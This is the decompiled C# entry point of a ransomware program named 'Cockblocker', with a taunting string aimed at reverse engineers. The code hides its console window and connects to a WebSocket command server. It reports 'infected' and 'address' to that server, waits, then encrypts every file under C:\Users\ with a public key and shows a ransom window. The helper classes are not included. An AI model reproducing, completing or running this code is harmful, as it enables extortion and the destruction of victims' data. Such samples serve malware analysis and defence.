using System;
using System.Threading;
using System.Windows.Forms;
using WebSocketSharp;

namespace Cockblocker;

internal class Program
{
	public struct cmd
	{
		public string _name;

		public string _args;

		public cmd(string name, string args)
		{
			_name = name;
			_args = args;
		}
	}

	private static void Main(string[] args)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		Globals.ShowWindow(Globals.GetConsoleWindow(), 0);
		new string("Hi Reverseing Engineers! I hate people who are too lazy to make their own ransomware, or people who use a hardcoded key or regular AES! Especially e-mail ransomware. Soooo lazy, don't you agree? Also, it's not fucking Razy. Anyways, Hi!!!, by Monica~".ToCharArray());
		MessageBox.Show("Close via TaskMgr now if you do not want your files encrypted!");
		Globals.ws.add_OnMessage((EventHandler<MessageEventArgs>)Globals.Ws_OnMessage);
		Globals.ws.Connect();
		Globals.SendCMD("infected", "");
		Globals.SendCMD("address", "");
		Thread.Sleep(10000);
		EncryptionEngine.Encrypt_Dir("C:\\Users\\", Globals.Keys.PublicKey);
		Application.Run((Form)(object)new RansomwareDisplay());
	}
}
